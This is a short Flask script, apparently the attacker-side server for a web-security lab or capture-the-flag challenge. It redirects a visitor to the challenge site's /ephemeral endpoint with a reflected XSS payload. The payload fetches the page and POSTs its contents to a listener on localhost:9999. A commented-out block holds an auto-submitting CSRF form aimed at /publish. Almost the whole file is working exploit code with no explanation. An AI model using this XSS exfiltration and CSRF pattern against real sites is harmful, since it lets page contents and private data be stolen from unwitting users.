#!/usr/bin/exec-suid -- /usr/bin/python3 -I
import flask
import os
from urllib.parse import quote
app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge_get():
    payload='<script>fetch("/").then(r=>r.text()).then(t=>fetch("http://localhost:9999",{method:"POST",body:t}))</script>'
    page = f'<html><body><script>window.location.href="http://challenge.localhost:80/ephemeral?msg={quote(payload)}"</script></body></html>'
    #POST:page = '''<html><body>
#<form action="http://challenge.localhost:80/publish" method="post">
#<input type="hidden" name="content"
#<input type="submit" id="submit">
#</form>
#<script>document.getElementById("submit").click()</script>
#</body></html>'''
    return page

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run("hacker.localhost", 1337)
